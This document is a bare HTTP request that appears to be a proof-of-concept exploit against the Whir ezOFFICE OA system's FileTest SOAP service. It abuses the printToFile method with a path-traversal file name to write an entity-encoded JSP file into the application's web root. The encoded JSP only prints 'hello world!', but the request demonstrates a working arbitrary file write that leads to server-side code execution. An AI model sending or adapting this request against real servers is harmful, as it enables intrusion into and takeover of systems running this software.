POST /defaultroot/services/FileTest;1.js HTTP/1.1
Host:
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6
Connection: close
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Content-Length: 1642

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:util="http://com.whir.ezoffice.ezform.util.StringUtil"
xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
<soapenv:Header/>
<soapenv:Body>
<util:printToFile
soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<fileName xsi:type="soapenc:string">../server/oa/deploy/defaultroot.war/public/upload/date.jsp.</fileName>
<content xsi:type="soapenc:string">&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x68;&#x65;&#x6c;&#x6c;&#x6f;&#x20;&#x77;&#x6f;&#x72;&#x6c;&#x64;&#x21;&#x22;&#x29;&#x3b;&#x0a;&#x25;&#x3e;</content>
</util:printToFile>
</soapenv:Body>
</soapenv:Envelope>



